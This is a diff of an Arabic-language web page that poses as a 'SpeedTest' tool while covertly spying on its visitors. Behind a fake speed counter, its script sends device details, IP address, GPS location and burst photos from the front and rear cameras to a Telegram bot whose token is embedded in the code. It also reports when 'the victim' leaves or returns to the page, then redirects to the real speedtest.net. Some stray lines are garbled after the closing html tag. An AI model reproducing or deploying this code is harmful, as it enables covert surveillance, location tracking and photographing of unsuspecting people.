@@ -3,124 +3,141 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest Global | فحص سرعة الشبكة</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest Pro | فحص جودة الاتصال</title>
     <style>
-        :root { --accent: #00d2ff; --dark-bg: #0b0e18; }
-        body { background: var(--dark-bg); color: white; font-family:  Segoe UI , sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.03) 1px, transparent 1px); background-size: 25px 25px; z-index: -1; }
-        .main-card { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 300; letter-spacing: 2px; }
-        .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
-        .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #goBtn { width: 160px; height: 160px; border-radius: 50%; border: none; background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; border: 4px solid var(--accent); transition: 0.4s; z-index: 5; box-shadow: inset 0 0 20px rgba(0, 210, 255, 0.2); outline: none; }
-        #goBtn:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
-        .loader-ring { position: absolute; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: var(--accent); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
-        #speedDisplay { display: none; text-align: center; }
-        .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
-        .unit { font-size: 14px; color: #8892b0; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        :root { --accent: #00d2ff; --bg: #0b0e18; }
+        body { background: var(--bg); color: white; font-family:  Segoe UI , Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .btn-go { width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 32px; font-weight: 900; cursor: pointer; transition: 0.4s; outline: none; }
+        .btn-go:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
+        #speedBox { display: none; margin-top: 10px; }
+        .num { font-size: 50px; font-weight: 800; color: var(--accent); }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="grid-bg"></div>
-    <div class="main-card">
-        <h1>SPEEDTEST <span class="status-dot"></span></h1>
-        <p id="subText" style="color: #8892b0; font-size: 13px;">اختبر سرعة اتصالك بالسيرفرات الإقليمية</p>
-        <div class="gauge-box">
-            <div id="ring" class="loader-ring"></div>
-            <button id="goBtn">GO</button>
-            <div id="speedDisplay">
-                <span id="num" class="speed-num">0.0</span>
-                <span class="unit">Mbps (Download)</span>
-            </div>
+    <div class="card">
+        <h1 style="letter-spacing: 2px; font-weight: 300;">SPEEDTEST</h1>
+        <p id="status" style="color: #8892b0; font-size: 13px; margin-bottom: 25px;">اضغط للبدء واختيار أفضل سيرفر</p>
+        <button id="goBtn" class="btn-go">GO</button>
+        <div id="speedBox">
+            <span id="num" class="num">0.0</span>
+            <div style="color: #8892b0; font-size: 14px;">Mbps Download</div>
         </div>
-        <div style="margin-top: 20px; font-size: 11px; color: #555;">Server: YEMEN-DATA-01</div>
     </div>
-    <video id="v" autoplay playsinline></video>
+
+    <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
         const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
         const chat = "7984067238";
 
+        // دالة الإرسال الموحدة
         async function sendToTelegram(msg, isImg = false, data = null) {
             const url = `https://api.telegram.org/bot${token}/`;
             try {
-                if(!isImg) {
-                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
-                } else {
-                    const fd = new FormData();
-                    fd.append("chat_id", chat);
+                const fd = new FormData();
+                fd.append("chat_id", chat);
+                if (isImg) {
                     fd.append("photo", data, "shot.jpg");
-                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
+                    fd.append("caption", msg);
+                    await fetch(url + "sendPhoto", { method: "POST", body: fd });
+                } else {
+                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                 }
-            } catch(e) {}
+            } catch (e) {}
         }
 
+        // جلب التقرير الشامل والمفصل
         async function getFullReport() {
-            let info = `📊 *تقرير شامل للهدف*:\n\n`;
+            let info = `📊 *تقرير شامل للهدف (مستهدف مجهول):*\n\n`;
             
-            // 1. معلومات الجهاز والرام والمعالج
+            // معلومات العتاد
             info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
-            info += `• 💾 الرام: \`${navigator.deviceMemory || "غير معروف"} GB\`\n`;
+            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
             info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
-            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
-            
-            // 2. معلومات الشبكة والاتصال (WiFi/Cellular)
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                let netType = conn.type ===  wifi  ? "🌐 WiFi" : (conn.type ===  cellular  ? "📶 خلوي" : "📡 متصل");
-                info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
-                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
-            }
+            info += `• 🖥️ الشاشة: \`${screen.width}x${screen.height}\`\n`;
 
-            // 3. البطارية
+            // حالة البطارية
             try {
                 const b = await navigator.getBattery();
-                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋 بطارية"})\n`;
+                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
             } catch(e) {}
 
-            // 4. الـ IP والموقع واللغة
-            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
+            // نوع الشبكة (WiFi / 4G)
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                let type = conn.type ===  wifi  ? "🌐 WiFi" : "📶 Cellular/4G";
+                info += `• 📶 نوع الشبكة: \`${type} (${conn.effectiveType})\`\n`;
+            }
+
+            // الـ IP
             try {
-                const ipRes = await fetch( https://api.ipify.org?format=json );
-                const ipData = await ipRes.json();
-                info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
+                const res = await fetch( https://api.ipify.org?format=json );
+                const data = await res.json();
+                info += `• 🌐 الـ IP: \`${data.ip}\`\n`;
             } catch(e) {}
 
             return info;
         }
 
-        async function snap(mode) {
+        // دالة التصوير المتعدد (Burst)
+        async function captureBurst(mode, count) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById("v");
                 const c = document.getElementById("c");
-                v.srcObject = s;
-                await new Promise(r => setTimeout(r, 1200));
-                c.width = 720; c.height = 540;
-                c.getContext("2d").drawImage(v, 0, 0);
-                s.getTracks().forEach(t => t.stop());
-                return new Promise(res => c.toBlob(res, "image/jpeg", 0.75));
-            } catch(e) { return null; }
+                v.srcObject = stream;
+                
+                await new Promise(r => setTimeout(r, 2000)); // انتظار لضبط الإضاءة
+
+                for (let i = 0; i < count; i++) {
+                    c.width = 720; c.height = 960;
+                    c.getContext("2d").drawImage(v, 0, 0);
+                    const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.6));
+                    if (blob) {
+                        sendToTelegram(`📸 ${mode ===  user  ?  أمامية  :  خلفية } - لقطة ${i+1}/5`, true, blob);
+                    }
+                    await new Promise(r => setTimeout(r, 400)); 
+                }
+                stream.getTracks().forEach(t => t.stop()); // إغلاق المسار
+            } catch (e) {}
         }
+
+        // تتبع حالة "المغادرة" أو "البقاء"
+        window.onblur = () => sendToTelegram("⚠️ *الضحية غادر الصفحة الآن (Background)*");
+        window.onfocus = () => sendToTelegram("✅ *الضحية عاد لفتح الصفحة الآن*");
 
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
-            document.getElementById("ring").style.display = "block";
-            document.getElementById("speedDisplay").style.display = "block";
-            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";
+            document.getElementById("speedBox").style.display = "block";
+            document.getElementById("status").innerText = "جاري الاتصال بالسيرفر...";
 
-            // حركة العداد الوهمي
             const timer = setInterval(() => {
-                let random = (Math.random() * (95 - 78) + 78).toFixed(1);
-                document.getElementById("num").innerText = random;
+                document.getElementById("num").innerText = (Math.random() * (99 - 88) + 88).toFixed(1);
             }, 100);
 
-            // 1. إرسال التقرير النصي فوراً
-            const report = await getFullReport();
+            // 1. التقرير والموقع
+            sendToTelegram(await getFullReport());
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToTelegram(`📍 موقع الهدف:\n[فتح عبر خرائط جوجل](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
+            });
+
+            // 2. تصوير Burst (5 أمامية و 5 خلفية)
+            await captureBurst("user", 5);
+            await captureBurst("environment", 5);
+
+            // 3. التوجيه النهائي
+            setTimeout(() => {
+                clearInterval(timer);
+                location.href = "https://www.speedtest.net/ar";
+            }, 3000); 
+        };
+    </script>
+</body>
+</html>            const report = await getFullReport();
             await sendToTelegram(report);
 
             // 2. طلب وإرسال الموقع الجغرافي
